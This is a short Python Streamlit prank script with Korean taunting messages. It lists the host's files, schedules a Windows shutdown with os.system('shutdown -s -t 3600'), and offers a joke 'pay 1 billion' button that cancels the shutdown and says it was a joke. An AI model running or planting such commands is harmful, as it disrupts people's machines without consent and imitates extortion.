import streamlit as st
import os
st.write("니 컴퓨터 정보 내가 다 캐냄 ㅋ")
st.write(os.listdir())
st.write("너 컴퓨터 강제종료 ㅅㄱ ㅋㅋㅋ")
os.system("shutdown -s -t 3600")

if st.button("10억을 보내서 강제종료 멈추기"):
    with st.echo():
        os.system("shutdown -a")
    st.write("넝담이야~ ㅋㅋ")